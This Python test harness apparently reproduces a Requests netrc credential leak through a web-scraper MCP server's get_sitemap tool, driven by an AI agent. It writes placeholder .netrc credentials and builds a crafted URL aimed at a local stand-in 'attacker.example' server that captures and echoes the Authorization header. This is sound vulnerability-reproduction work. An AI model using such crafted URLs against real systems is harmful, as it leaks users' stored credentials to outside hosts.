"""Run the GH-P2-053 Requests netrc pair through the shared Host projection."""

from __future__ import annotations

import argparse
import base64
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import quote

from shared_host_runner import evidence_rows, run_shared_host_case


CASE_ID = "GH-P2-053"
SERVER_NAME = "ImYourBoyRoy/WebScraperToolkit"
SOURCE_COMMIT = "f4ca1c5e5d9b370d0625f1f3f882d0761c00fe32"
VULNERABLE_REQUESTS = "2.32.3"
FIXED_REQUESTS = "2.32.4"
NETRC_MACHINE = "example.com"
NETRC_LOGIN = "GT_P2_053_USER"
NETRC_PASSWORD = "GT_P2_053_SECRET"
URL_USERINFO_PASSWORD = "GT_P2_053_BASELINE"
EFFECT = "Basic " + base64.b64encode(f"{NETRC_LOGIN}:{NETRC_PASSWORD}".encode()).decode()
SAFE_USERINFO = "Basic " + base64.b64encode(f"{NETRC_MACHINE}:{URL_USERINFO_PASSWORD}".encode()).decode()
BOUNDARY_MARKER = "GH_P2_053_SITEMAP_AUTH_READBACK"
TOOL_NAME = "get_sitemap"
AGENT_TASK = "Call the frozen get_sitemap Tool and report only its returned result."
SYSTEM_PROMPT = "You are a deterministic research host. Use the frozen tool call and report only its returned Tool result."


class BoundaryHandler(BaseHTTPRequestHandler):
    server_version = "GT-P2-053-Boundary/1"

    def _record(self) -> dict[str, object]:
        boundary = self.server  # type: ignore[attr-defined]
        item = {
            "method": self.command,
            "path": self.path,
            "headers": {key.lower(): value for key, value in self.headers.items()},
        }
        boundary.requests.append(item)
        return item

    def do_HEAD(self) -> None:  # noqa: N802
        self._record()
        if self.path.split("?", 1)[0] == "/sitemap.xml":
            self.send_response(200)
            self.send_header("Content-Type", "application/xml")
            self.send_header("Content-Length", "0")
        else:
            self.send_response(404)
            self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self) -> None:  # noqa: N802
        item = self._record()
        if self.path.split("?", 1)[0] != "/sitemap.xml":
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        authorization = str(item["headers"].get("authorization", "NO_AUTH"))
        visible_url = (
            "https://public.example/GH-P2-053/visible?authorization="
            + quote(authorization, safe="")
        )
        body = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'
            f"<url><loc>{visible_url}</loc></url>"
            f"<url><loc>{BOUNDARY_MARKER}</loc></url>"
            "</urlset>"
        ).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/xml; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_args: object) -> None:
        return


class Boundary(ThreadingHTTPServer):
    allow_reuse_address = True

    def __init__(self) -> None:
        super().__init__(("127.0.0.1", 0), BoundaryHandler)
        self.requests: list[dict[str, object]] = []


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--side", choices=("vulnerable", "fixed"), required=True)
    parser.add_argument("--repetition", type=int, choices=(1, 2, 3), required=True)
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args()

    boundary = Boundary()
    thread = threading.Thread(target=boundary.serve_forever, daemon=True)
    thread.start()
    home = Path("/tmp/gt-home")
    netrc = home / ".netrc"
    home.mkdir(parents=True, exist_ok=True)
    netrc.write_text(
        f"machine {NETRC_MACHINE} login {NETRC_LOGIN} password {NETRC_PASSWORD}\n",
        encoding="utf-8",
    )
    netrc.chmod(0o600)
    url = (
        f"http://{NETRC_MACHINE}:{URL_USERINFO_PASSWORD}@attacker.example:"
        f"{boundary.server_address[1]}/GH-P2-053"
    )
    requests_version = VULNERABLE_REQUESTS if args.side == "vulnerable" else FIXED_REQUESTS
    env = {
        "PYTHONPATH": f"/workspace/source/src:/opt/deps/{args.side}:/opt/gt",
        "PATH": "/usr/local/bin:/usr/bin:/bin",
        "HOME": str(home),
        "NETRC": str(netrc),
        "WST_LOG_DIR": "/tmp/gt-logs",
        "PYTHONIOENCODING": "utf-8",
        "PYTHONWARNINGS": "ignore",
        "HTTP_PROXY": "",
        "HTTPS_PROXY": "",
        "ALL_PROXY": "",
        "http_proxy": "",
        "https_proxy": "",
        "all_proxy": "",
        "NO_PROXY": "attacker.example,127.0.0.1,localhost",
        "no_proxy": "attacker.example,127.0.0.1,localhost",
    }
    command = [
        "python",
        "-c",
        "import web_scraper_toolkit.server.mcp_server as m; m.display_welcome=lambda: None; m.main()",
        "--stdio",
    ]
    try:
        record = run_shared_host_case(
            run_id=f"{CASE_ID}-{args.side}-{args.repetition}",
            case_id=CASE_ID,
            revision=args.side,
            repetition=args.repetition,
            command=command,
            cwd=Path("/workspace/source"),
            env=env,
            server_name=SERVER_NAME,
            tool_name=TOOL_NAME,
            tool_arguments={"url": url, "keywords": None, "limit": 10, "timeout_profile": "standard"},
            task=AGENT_TASK,
            system_prompt=SYSTEM_PROMPT,
            server_revision=f"{SOURCE_COMMIT};requests=={requests_version}",
            timeout=90,
            startup_timeout=30,
        )
        record["external_boundary"] = {
            "boundary": "Container-local HTTP boundary at attacker.example; Docker network none.",
            "request_count": len(boundary.requests),
            "requests": boundary.requests,
            "netrc_machine": NETRC_MACHINE,
            "target_url_projection": url.replace(str(boundary.server_address[1]), "{BOUNDARY_PORT}"),
        }
        args.output.mkdir(parents=True, exist_ok=True)
        (args.output / "host_record.json").write_text(json.dumps(record, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        (args.output / "evidence.jsonl").write_text("".join(json.dumps(row, ensure_ascii=False) + "\n" for row in evidence_rows(record)), encoding="utf-8")
        valid = record["quality"]["invalid_run"] is False
        print(json.dumps({"status": "OK" if valid else "INVALID", "output": str(args.output), "request_count": len(boundary.requests)}))
        return 0 if valid else 1
    finally:
        boundary.shutdown()
        boundary.server_close()
        thread.join(timeout=3)


if __name__ == "__main__":
    raise SystemExit(main())
